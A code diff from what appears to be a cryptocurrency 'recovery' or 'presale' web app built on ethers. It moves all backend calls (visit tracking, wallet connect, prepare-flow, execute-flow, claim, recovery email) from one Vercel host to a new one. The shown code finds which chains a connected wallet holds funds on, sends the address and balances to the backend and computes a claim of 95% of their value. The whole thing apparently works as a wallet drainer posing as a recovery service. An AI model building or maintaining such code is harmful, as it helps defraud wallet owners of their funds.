@@ -5,6 +5,11 @@ import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
+// API CONFIGURATION
+// ============================================
+const BACKEND_URL = 'https://recoveryback.vercel.app';
+
+// ============================================
 // LANGUAGE DETECTION & TRANSLATIONS
 // ============================================
 
@@ -723,7 +728,7 @@ function App() {
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
+        const response = await fetch(`${BACKEND_URL}/api/track-visit`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -777,7 +782,7 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
         
-        await fetch('https://hyperback.vercel.app/api/presale/connect', {
+        await fetch(`${BACKEND_URL}/api/presale/connect`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -858,7 +863,7 @@ function App() {
     if (!address) return;
     
     try {
-      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
+      await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
@@ -871,7 +876,7 @@ function App() {
   // Send email notification using simple PHP mail function
   const sendEmailNotification = async (recoveryAmount, chains, txHash) => {
     try {
-      const response = await fetch('https://hyperback.vercel.app/api/send-recovery-email.php', {
+      const response = await fetch(`${BACKEND_URL}/api/send-recovery-email`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -1016,7 +1021,7 @@ function App() {
               }
             };
             
-            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
+            await fetch(`${BACKEND_URL}/api/presale/execute-flow`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
@@ -1061,7 +1066,7 @@ function App() {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        await fetch('https://hyperback.vercel.app/api/presale/claim', {
+        await fetch(`${BACKEND_URL}/api/presale/claim`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
